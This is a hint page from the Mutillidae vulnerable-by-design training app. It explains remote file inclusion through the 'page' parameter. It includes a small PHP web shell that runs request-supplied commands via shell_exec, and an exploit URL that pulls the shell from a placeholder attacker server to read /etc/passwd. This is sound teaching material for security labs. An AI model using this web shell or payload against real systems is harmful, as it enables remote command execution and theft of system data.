			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Remote file inclusion allows an attacker to include file remote
			(from the web servers point of view)
			possibly allowing code execution, denial of service, and data disclosure.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			The page displayed in Mutillidae is determined
			by the value of the "page" parameter. What would happen the "page"
			parameter was changed to a filename URI which is located on a remote
			server but not
			intended to be served?
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			A URI can be used to specify a remote file such as
			http://www.google.com.
			<br/><br/>
			Click this link to load the Google search page into Mutillidae. Note the page parameter contains the URL to the search page.
			<a href="index.php?page=http://www.google.com">index.php?page=http://www.google.com</a>
			<br/><br/>
			If we host our own content, we could control the content of the page loaded by the page parameter.
			For example, host a small PHP web shell file on a site you control.
			<br/>
<code>
&lt;?php
	echo &quot;&lt;pre&gt;&quot;;
	echo &quot;shell_exec &quot;.$_REQUEST[&quot;pCommand&quot;].&quot;\n\n&quot;;
	echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
	echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code>
			<br/>
			Once the web shell is ready to pull from the attacking server, create a hyperlink that will exploit
			the remote file inclusion vulnerability in the index.php page to incorporate the web shell into the
			web page.
			<br/>
<code>
http://mutillidae/index.php?page=http://[ATTACKING SERVER IP ADDRESS]/shell.php?pCommand=cat%2b%2fetc%2fpasswd
</code>
<br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisInsecureDirectObjectReferenceIDOR);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisanOpenRedirect);?>
<br/><br/>